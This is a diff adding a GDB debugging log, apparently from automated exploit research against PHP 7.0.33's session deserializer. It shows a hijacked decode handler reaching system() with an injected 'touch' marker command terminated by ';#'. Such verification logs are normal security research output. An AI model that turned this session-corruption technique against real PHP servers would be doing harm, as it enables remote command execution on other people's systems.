@@ -1,0 +1,18 @@
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+0x00007ffff7d583a7 in ?? () from /lib/x86_64-linux-gnu/libc.so.6
+Breakpoint 1 at 0x4ac87e: file /tmp/opencode/research/vermatrix_20261022T004325Z/build/php-7.0.33/ext/session/session.c, line 233.
+Breakpoint 2 at 0x7ffff7d1c090
+Breakpoint 3 at 0x4aa442: file /tmp/opencode/research/vermatrix_20261022T004325Z/build/php-7.0.33/ext/session/session.c, line 1698.
+DECODE hit=1 data=0x7ffff7a65000 val=0x7ffff7a65018 len=131014 level=1 bgdata=0x7ffff7a5e540 ser2decode=0x4ad256 ser2name=php_binary
+0x7ffff7a65018:	0x742f206863756f74	0x636e65706f2f706d
+0x7ffff7a65028:	0x657365722f65646f	0x7265762f68637261
+0x7ffff7a65038:	0x325f78697274616d	0x5432323031363230
+0x7ffff7a65048:	0x2f5a353233343030	0x302e372f7362616c
+FLUSH n=1 ser2=0x7ffff7d1c090
+DECODE hit=2 data=0x7ffff7a86000 val=0x7ffff7a86018 len=131014 level=0 bgdata=(nil) ser2decode=0x7ffff7d1c090 ser2name=php_binary
+SYSTEM hit cmd=0x7ffff7a86018
+0x7ffff7a86018:	"touch /tmp/opencode/research/vermatrix_20261022T004325Z/labs/7.0.33/PASSTHRU_7033;#", ' ' <repeats 34 times>, "i:140737351106704;\001zs:130865:\""
+[Detaching after vfork from child process 1709040]
+FLUSH n=2 ser2=0x7ffff7d1c090
+[Inferior 1 (process 1708976) detached]
